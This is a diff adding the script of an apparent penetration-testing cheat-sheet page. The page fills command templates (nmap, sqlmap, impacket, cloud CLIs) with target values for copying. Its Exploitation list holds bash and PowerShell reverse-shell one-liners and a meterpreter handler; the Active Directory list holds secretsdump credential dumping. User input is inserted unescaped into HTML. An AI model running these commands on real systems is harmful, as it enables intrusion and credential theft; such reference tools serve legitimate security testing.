@@ -394,7 +394,345 @@
   <div class="toast" id="toast"></div>
 
   <script>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+    const commands = {
+      "Active Directory": [
+        "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
+        "echo '{{IP}} {{DC}} {{DOMAIN}}' >> /etc/hosts",
+        "smbclient -L //{{IP}} -U {{USER}}",
+        "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --rid-brute",
+        "bloodhound-python -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' -ns {{IP}} -c all",
+        "impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+        "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+        "enum4linux -a {{IP}}",
+        "ldapsearch -x -h {{IP}} -D '{{USER}}@{{DOMAIN}}' -w '{{PASSWORD}}' -b 'dc={{DOMAIN_BASE}}'",
+        "rpcclient -U {{USER}}%{{PASSWORD}} {{IP}}"
+      ],
+      "Web Application": [
+        "dirsearch -u {{URL}} -e php,html,js --recursive -t 70",
+        "nikto -h {{URL}}",
+        "gobuster dir -u {{URL}} -w /usr/share/wordlists/common.txt",
+        "sqlmap -u {{URL}} --dbs --batch",
+        "ffuf -u {{URL}}/FUZZ -w /usr/share/wordlists/common.txt",
+        "nmap -sC -sV -p {{PORT}} {{IP}}",
+        "curl -X GET {{URL}} -H 'User-Agent: Mozilla/5.0'",
+        "wpscan --url {{URL}} --enumerate u,p,t",
+        "whatweb {{URL}}",
+        "wafw00f {{URL}}"
+      ],
+      "Network Reconnaissance": [
+        "nmap -sn {{IP}}/24",
+        "nmap -sS -O {{IP}}",
+        "masscan -p1-65535 {{IP}} --rate=1000",
+        "ping {{IP}}",
+        "traceroute {{IP}}",
+        "whois {{DOMAIN}}",
+        "dig {{DOMAIN}}",
+        "nslookup {{DOMAIN}}",
+        "host {{DOMAIN}}",
+        "netstat -tulpn | grep {{PORT}}"
+      ],
+      "Exploitation": [
+        "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {{IP}}; set LPORT {{PORT}}; exploit'",
+        "nc -lvnp {{PORT}}",
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1",
+        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+      ],
+      "Cloud Security": [
+        "aws configure",
+        "aws s3 ls",
+        "aws ec2 describe-instances",
+        "az login",
+        "az vm list",
+        "gcloud compute instances list",
+        "kubectl get pods",
+        "docker ps",
+        "terraform plan",
+        "ansible-playbook -i hosts playbook.yml"
+      ]
+    };
+
+    const validationRules = {
+      url: {
+        regex: /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)$/,
+        message: "Valid URL format (http/https)",
+        optional: true
+      },
+      ip: {
+        regex: /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/,
+        message: "Valid IP address (0.0.0.0 - 255.255.255.255)",
+        optional: true
+      },
+      port: {
+        regex: /^(?:[1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$/,
+        message: "Valid port (1-65535)",
+        optional: true
+      },
+      user: {
+        regex: /^[a-zA-Z0-9._-]+$/,
+        message: "Alphanumeric, dots, underscores, hyphens only",
+        optional: true
+      },
+      password: {
+        regex: /^.+$/,
+        message: "Any characters allowed",
+        optional: true
+      },
+      domain: {
+        regex: /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
+        message: "Valid domain format (example.com)",
+        optional: true
+      },
+      dc: {
+        regex: /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
+        message: "Valid domain controller format",
+        optional: true
+      }
+    };
+
+    let activeCategory = 'all';
+    let validFields = {};
+
+    function updateCharCount(fieldId, maxLength) {
+      const input = document.getElementById(fieldId);
+      const count = input.value.length;
+      const countElement = document.getElementById(fieldId + '-count');
+      
+      countElement.textContent = `${count}/${maxLength}`;
+      countElement.className = 'char-count';
+      
+      if (count > maxLength * 0.8) {
+        countElement.classList.add('warning');
+      }
+      if (count >= maxLength) {
+        countElement.classList.add('error');
+      }
+    }
+
+    function validateField(fieldId) {
+      const input = document.getElementById(fieldId);
+      const value = input.value.trim();
+      const rule = validationRules[fieldId];
+      const validationElement = document.getElementById(fieldId + '-validation');
+      
+      updateCharCount(fieldId, parseInt(input.getAttribute('maxlength')));
+      
+      if (value === '') {
+        if (rule.optional) {
+          input.className = '';
+          validationElement.textContent = '';
+          validationElement.className = 'validation-message';
+          validFields[fieldId] = true;
+          return true;
+        } else {
+          input.className = 'invalid';
+          validationElement.textContent = 'Required field';
+          validationElement.className = 'validation-message invalid';
+          validFields[fieldId] = false;
+          return false;
+        }
+      }
+      
+      if (rule.regex.test(value)) {
+        input.className = 'valid';
+        validationElement.textContent = '✓ ' + rule.message;
+        validationElement.className = 'validation-message valid';
+        validFields[fieldId] = true;
+        return true;
+      } else {
+        input.className = 'invalid';
+        validationElement.textContent = '✗ ' + rule.message;
+        validationElement.className = 'validation-message invalid';
+        validFields[fieldId] = false;
+        return false;
+      }
+    }
+
+    function validateAndRender(fieldId) {
+      validateField(fieldId);
+      renderCommands();
+      updateStats();
+    }
+
+    function getValues() {
+      return {
+        IP: document.getElementById("ip").value,
+        URL: document.getElementById("url").value,
+        PORT: document.getElementById("port").value,
+        USER: document.getElementById("user").value,
+        PASSWORD: document.getElementById("password").value,
+        DOMAIN: document.getElementById("domain").value,
+        DC: document.getElementById("dc").value,
+        DOMAIN_BASE: document.getElementById("domain").value.replace(/\./g, ',dc=')
+      };
+    }
+
+    function showCategory(category) {
+      activeCategory = category;
+      
+      // Update button states
+      document.querySelectorAll('.category-btn').forEach(btn => {
+        btn.classList.remove('active');
+      });
+      
+      if (category === 'all') {
+        document.querySelector('.show-all-btn').classList.add('active');
+      } else {
+        document.querySelector(`[onclick="showCategory('${category}')"]`).classList.add('active');
+      }
+      
+      renderCommands();
+    }
+
+    function updateStats() {
+      const validCount = Object.values(validFields).filter(Boolean).length;
+      document.getElementById('valid-fields').textContent = validCount;
+      document.getElementById('active-category').textContent = activeCategory;
+      
+      // Count ready commands (commands with all required fields filled)
+      const values = getValues();
+      let readyCount = 0;
+      
+      const categoriesToCheck = activeCategory === 'all' ? Object.keys(commands) : [activeCategory];
+      
+      categoriesToCheck.forEach(cat => {
+        if (commands[cat]) {
+          commands[cat].forEach(cmd => {
+            const requiredFields = cmd.match(/{{(.*?)}}/g);
+            if (requiredFields) {
+              const allFilled = requiredFields.every(field => {
+                const key = field.replace(/{{|}}/g, '').trim();
+                return values[key] && values[key].trim() !== '';
+              });
+              if (allFilled) readyCount++;
+            } else {
+              readyCount++; // Commands without variables are always ready
+            }
+          });
+        }
+      });
+      
+      document.getElementById('ready-commands').textContent = readyCount;
+    }
+
+    function updateCategoryCounts() {
+      const search = document.getElementById("search").value.toLowerCase();
+      
+      for (const category in commands) {
+        const filtered = commands[category].filter(cmd => 
+          cmd.toLowerCase().includes(search) || 
+          category.toLowerCase().includes(search)
+        );
+        
+        const countId = 'count-' + category.toLowerCase().replace(/[^a-z]/g, '');
+        const countElement = document.getElementById(countId);
+        if (countElement) {
+          countElement.textContent = filtered.length;
+        }
+      }
+      
+      // Update "Show All" count
+      let totalCount = 0;
+      for (const category in commands) {
+        const filtered = commands[category].filter(cmd => 
+          cmd.toLowerCase().includes(search) || 
+          category.toLowerCase().includes(search)
+        );
+        totalCount += filtered.length;
+      }
+      document.getElementById('count-all').textContent = totalCount;
+      document.getElementById('total-commands').textContent = totalCount;
+    }
+
+    function renderCommands() {
+      const search = document.getElementById("search").value.toLowerCase();
+      const values = getValues();
+      const list = document.getElementById("command-list");
+      list.innerHTML = "";
+      
+      updateCategoryCounts();
+      
+      const categoriesToShow = activeCategory === 'all' ? Object.keys(commands) : [activeCategory];
+      
+      categoriesToShow.forEach(category => {
+        if (!commands[category]) return;
+        
+        const section = document.createElement("div");
+        section.className = "category active";
+
+        const title = document.createElement("h2");
+        title.textContent = category;
+        section.appendChild(title);
+
+        const filtered = commands[category].filter(cmd => 
+          cmd.toLowerCase().includes(search) || 
+          category.toLowerCase().includes(search)
+        );
+        
+        filtered.forEach(cmd => {
+          const rendered = cmd.replace(/{{(.*?)}}/g, (match, key) => {
+            const value = values[key.trim()];
+            if (value && value.trim() !== '') {
+              return `<span class="filled">${value}</span>`;
+            } else {
+              return `<span class="placeholder">${key.trim()}</span>`;
+            }
+          });
+          
+          const cmdDiv = document.createElement("div");
+          cmdDiv.className = "command";
+          cmdDiv.innerHTML = `
+            <div class="command-text">${rendered}</div>
+            <button class="copy-btn" onclick="copyToClipboard(\`${cmd.replace(/{{(.*?)}}/g, (_, key) => values[key.trim()] || '')}\`)">Copy</button>
+          `;
+          section.appendChild(cmdDiv);
+        });
+
+        if (filtered.length > 0) {
+          list.appendChild(section);
+        }
+      });
+      
+      updateStats();
+    }
+
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        showToast("Command copied to clipboard!");
+      });
+    }
+
+    function showToast(message) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 2000);
+    }
+
+    function clearAllInputs() {
+      ['url', 'ip', 'port', 'user', 'password', 'domain', 'dc'].forEach(fieldId => {
+        document.getElementById(fieldId).value = '';
+        document.getElementById(fieldId).className = '';
+        document.getElementById(fieldId + '-validation').textContent = '';
+        document.getElementById(fieldId + '-validation').className = 'validation-message';
+        updateCharCount(fieldId, parseInt(document.getElementById(fieldId).getAttribute('maxlength')));
+        validFields[fieldId] = true;
+      });
+      
+      document.getElementById('search').value = '';
+      renderCommands();
+      showToast("All inputs cleared!");
+    }
+
+    // Initialize
+    ['url', 'ip', 'port', 'user', 'password', 'domain', 'dc'].forEach(fieldId => {
+      validFields[fieldId] = true;
+      updateCharCount(fieldId, parseInt(document.getElementById(fieldId).getAttribute('maxlength')));
+    });
+    
+    renderCommands();
   </script>
 </body>
 </html>
